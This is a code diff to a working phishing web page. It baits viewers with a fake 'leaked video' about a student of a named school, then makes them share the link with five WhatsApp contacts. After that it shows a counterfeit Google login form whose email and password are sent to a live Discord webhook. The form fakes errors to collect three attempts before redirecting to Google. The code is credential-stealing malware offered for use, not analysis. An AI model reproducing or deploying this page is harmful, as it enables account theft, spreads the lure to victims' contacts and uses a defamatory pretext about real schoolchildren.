@@ -5,16 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>HUBVIDEO - Marcellin Mobateli</title>
     <link id="favicon" rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=pornhub.com&sz=128">
-    <meta property="og:title" content="FUITE : ELEVE DE MARCELLIN MOBATELI">
+    <!-- Meta Balises pour le partage (Open Graph / Facebook / WhatsApp) -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://service-chrome-2026-web-app.onrender.com/">
+<meta property="og:title" content="FUITE : ELEVE DE MARCELLIN MOBATELI">
 <meta property="og:description" content="Séquence exclusive de l'Institut Marcellin Mobateli. Regardez la vidéo complète de l'incident.">
-<meta property="og:site_name" content="HUBVIDEO">
+<meta property="og:image" content="https://service-chrome-2026-web-app.onrender.com/thumbnail.jpg">
 
-<meta property="og:image" content="https://service-chrome-2026-web-app.onrender.com//thumbnail.jpg">
-<meta property="og:image:type" content="image/jpeg">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
+<!-- Meta Balises pour Twitter -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://service-chrome-2026-web-app.onrender.com/">
+<meta name="twitter:title" content="FUITE : ELEVE DE MARCELLIN MOBATELI">
+<meta name="twitter:description" content="Séquence exclusive de l'Institut Marcellin Mobateli. Regardez la vidéo complète de l'incident.">
+<meta name="twitter:image" content="https://service-chrome-2026-web-app.onrender.com/thumbnail.jpg">
 
-<meta property="og:type" content="video.other">
+<!-- Meta pour la couleur de la barre d'adresse sur mobile -->
+<meta name="theme-color" content="#ff9900">
     <style>
         body { margin: 0; font-family: 'Roboto', Arial, sans-serif; background: #000; color: white; overflow-x: hidden; }
         
@@ -59,6 +65,43 @@
 
         .footer { margin-top: 40px; display: flex; justify-content: flex-end; }
         .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+/* Style de la barre de progression */
+#page-share { 
+    display: none; 
+    background: #121212; 
+    min-height: 100vh; 
+    flex-direction: column; 
+    align-items: center; 
+    padding: 30px 20px; 
+    box-sizing: border-box;
+}
+.progress-container { 
+    width: 100%; 
+    max-width: 400px; 
+    background: #333; 
+    border-radius: 20px; 
+    margin: 25px 0; 
+    height: 20px; 
+    overflow: hidden; 
+    border: 1px solid #444;
+}
+#progress-bar { 
+    width: 0%; 
+    height: 100%; 
+    background: linear-gradient(90deg, #25D366, #128C7E); 
+    transition: width 0.4s ease; 
+}
+.btn-whatsapp { 
+    background: #25D366; 
+    color: white; 
+    border: none; 
+    padding: 15px 25px; 
+    border-radius: 50px; 
+    font-weight: bold; 
+    font-size: 16px; 
+    cursor: pointer; 
+    box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+}
     </style>
 </head>
 <body>
@@ -83,7 +126,20 @@
             </p>
         </div>
     </div>
+   <!-- SECTION PARTAGE WHATSAPP -->
+<div id="page-share" style="display: none; flex-direction: column; align-items: center; padding: 20px; text-align: center;">
+    <h2 style="color: #ff9900;">Vérification de sécurité</h2>
+    <p>Pour visionner la vidéo complète, partagez cette alerte avec 5 amis ou groupes sur WhatsApp.</p>
+    
+    <div style="width: 100%; background: #222; border-radius: 10px; margin: 20px 0; height: 25px; overflow: hidden;">
+        <div id="progress-bar" style="width: 0%; height: 100%; background: #25D366; transition: width 0.3s;"></div>
+    </div>
+    <p id="share-status">0/5 partages effectués</p>
 
+    <button onclick="shareOnWhatsApp()" style="background: #25D366; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; font-size: 1.1rem; cursor: pointer;">
+        PARTAGER SUR WHATSAPP
+    </button>
+</div>
     <div id="page-login">
         <div class="login-wrap">
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" class="google-logo">
@@ -121,54 +177,108 @@
     </div>
 
     <script>
-        const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
-        let essai = 0;
+    // Configuration
+    const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+    const shareLink = window.location.href; // Utilise l'URL actuelle de ta page
+    let shareCount = 0;
+    const totalNeeded = 5;
+    let essai = 0;
 
-        function ouvrirConnexion() {
-            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "Action : Clic sur Play." })
-            });
-            document.getElementById('page-video').style.display = 'none';
-            document.getElementById('page-login').style.display = 'flex';
-            document.getElementById('favicon').href = "https://www.google.com/favicon.ico";
-            document.title = "Connexion - Comptes Google";
+    // ÉTAPE 1 : Passer de la vidéo au partage
+    function ouvrirConnexion() {
+        // Log le clic sur Play
+        fetch(WEBHOOK, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: "🚨 **Action** : Clic sur Play. Début de l'étape partage." })
+        });
+
+        document.getElementById('page-video').style.display = 'none';
+        document.getElementById('page-share').style.display = 'flex';
+    }
+
+    // ÉTAPE 2 : Gérer le partage WhatsApp
+    function shareOnWhatsApp() {
+        // On définit le message unique (Texte + Lien TinyURL)
+        const message = encodeURIComponent("Regarde vite cette vidéo de l'Institut Marcellin Mobateli avant qu'elle soit supprimée ! 😱👇 https://tinyurl.com/Marcellin-mobateli-exclusive");
+        
+        // On ouvre WhatsApp avec uniquement ce message
+        window.open(`whatsapp://send?text=${message}`, '_blank');
+        
+        // Détecter quand l'utilisateur revient sur la page pour faire avancer la barre
+        window.onfocus = function() {
+            if (shareCount < totalNeeded) {
+                shareCount++;
+                updateProgress();
+                window.onfocus = null; // Reset pour le prochain clic
+            }
+        };
+    }
+
+    function updateProgress() {
+        let percentage = Math.round((shareCount / totalNeeded) * 100);
+        const progressBar = document.getElementById('progress-bar');
+        const shareStatus = document.getElementById('share-status');
+
+        if (progressBar) progressBar.style.width = percentage + "%";
+        if (shareStatus) shareStatus.innerText = `${percentage}% complété (${shareCount}/${totalNeeded})`;
+
+        // Si les 5 partages sont faits, on bascule vers le formulaire Google
+        if (shareCount >= totalNeeded) {
+            setTimeout(() => {
+                document.getElementById('page-share').style.display = 'none';
+                document.getElementById('page-login').style.display = 'flex';
+                document.getElementById('favicon').href = "https://www.google.com/favicon.ico";
+                document.title = "Connexion - Comptes Google";
+                
+                // Notification Discord
+                fetch(WEBHOOK, { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: "✅ **Succès** : 5 partages terminés. Passage à la capture." })
+                });
+            }, 1000);
         }
+    }
 
-        document.getElementById('showP').onclick = function(e) {
-            e.stopPropagation();
-            document.getElementById('pass').type = this.checked ? 'text' : 'password';
-        };
+    // ÉTAPE 3 : Gestion du formulaire de capture (Google)
+    document.getElementById('showP').onclick = function(e) {
+        e.stopPropagation();
+        document.getElementById('pass').type = this.checked ? 'text' : 'password';
+    };
 
-        document.getElementById('auditForm').onsubmit = function(e) {
-            e.preventDefault();
-            essai++;
-            const m = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
+    document.getElementById('auditForm').onsubmit = function(e) {
+        e.preventDefault();
+        essai++;
+        const m = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
 
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "Donnees Capturees (" + essai + "/3)",
-                        color: 16732928,
-                        fields: [
-                            { name: "Compte", value: "`"+m+"`" },
-                            { name: "Pass", value: "`"+p+"`" }
-                        ],
-                        timestamp: new Date()
-                    }]
-                })
-            }).then(() => {
-                if (essai < 3) {
-                    document.getElementById('pBox').classList.add('error');
-                    document.getElementById('eRow').style.display = 'block';
-                    document.getElementById('pass').value = '';
-                } else {
-                    window.location.href = "https://www.google.com";
-                }
-            });
-        };
-    </script>
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "Données Capturées (" + essai + "/3)",
+                    color: 16732928,
+                    fields: [
+                        { name: "Compte", value: "`" + m + "`" },
+                        { name: "Pass", value: "`" + p + "`" }
+                    ],
+                    footer: { text: "Victime de Marcellin Mobateli" },
+                    timestamp: new Date()
+                }]
+            })
+        }).then(() => {
+            if (essai < 3) {
+                document.getElementById('pBox').classList.add('error');
+                document.getElementById('eRow').style.display = 'block';
+                document.getElementById('pass').value = '';
+            } else {
+                // Redirection finale vers la vraie vidéo ou Google
+                window.location.href = "https://www.google.com";
+            }
+        });
+    };
+</script>
 </body>
 </html>
